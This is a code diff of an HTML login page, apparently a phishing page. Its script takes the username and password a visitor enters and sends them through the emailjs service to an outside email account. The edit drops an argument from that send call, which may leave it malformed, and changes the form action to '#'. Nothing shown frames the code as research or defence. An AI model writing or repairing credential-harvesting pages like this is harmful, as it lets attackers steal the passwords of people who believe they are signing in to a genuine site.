@@ -17,7 +17,7 @@
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        emailjs.send("service_udw5l3n", "", {
+        emailjs.send("service_udw5l3n", {
             username: username,
             password: password
         })
@@ -33,7 +33,7 @@
 <body>
     <div class="login-container">
         <h2>Login</h2>
-        <form action="" method="post">
+        <form action="#" method="post">
             <label for="username">Username</label>
             <input type="text" id="username" name="username" required>
             
